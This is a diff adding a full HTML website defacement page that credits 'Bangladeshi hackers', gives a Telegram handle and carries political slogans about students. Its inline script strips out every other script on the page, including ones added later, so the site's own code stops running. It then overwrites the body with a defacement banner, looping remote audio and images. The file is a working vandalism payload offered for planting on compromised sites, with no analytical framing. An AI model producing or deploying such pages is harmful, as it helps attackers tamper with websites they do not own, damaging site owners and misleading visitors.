@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked by bangladeshi hacker Alfaz</title>
+    <script>
+        // Disable any existing scripts
+        document.querySelectorAll('script').forEach(script => {
+            if (!script.src.includes('replace.js')) {
+                script.remove();
+            }
+        });
+
+        // Disable any new script elements added to the DOM
+        const observer = new MutationObserver(mutations => {
+            mutations.forEach(mutation => {
+                mutation.addedNodes.forEach(node => {
+                    if (node.nodeName === 'SCRIPT' && !node.src.includes('replace.js')) {
+                        node.remove();
+                    }
+                });
+            });
+        });
+
+        observer.observe(document, { childList: true, subtree: true });
+
+        // Your deface script
+        function deface() {
+            document.body.innerHTML = `
+                <style>
+                    body {
+                        background-color: black;
+                        color: white;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        font-family: Arial, sans-serif;
+                        text-align: center;
+                    }
+                    h1, h2, p {
+                        margin: 10px 0;
+                    }
+                    marquee {
+                        width: 100%;
+                        color: #dbd9d9;
+                    }
+                    img {
+                        margin: 20px 0;
+                    }
+                </style>
+                <h1>Site Defaced by [Bangladesh Students]</h1>
+                <h2>Save Pakistan Students ?</h2>
+                <p>Hacked By BD All Hackers</p>
+                <audio autoplay loop>
+                    <source src="https://e.top4top.io/m_3143hcpa90.mp3" type="audio/mpeg">
+                </audio>
+                <div id="clock"></div>
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT1OEXTl3y5OCEaB8JifwIzUx3p-RiTlyV_hTzxFaygrQ&s" style="width: 20%">
+                <h1 class="nprinsleyy nprinsley-text-rainbowan" style="font-size:40px;">Hacked By Bangladeshi All Hacker Save Bangladesh Students</h1>
+                <h2 style="font-size:25px;" class="nprinsley-text-glitchan">Hacked By Bd Telegram @alfazinfosec</h2>
+                <marquee class="foonathanPrinsley"><b style="color: #dbd9d9; font-size:16px;" class="nprinsley-text-redan"> এতো প্রাণ নেওয়া হলো  কেন . Protect Bangladesh Students</b></marquee>
+            `;
+        }
+
+        // Wait until the document is fully loaded before running the deface function
+        document.addEventListener('DOMContentLoaded', deface);
+    </script>
+</head>
+<body>
+</body>
+</html>
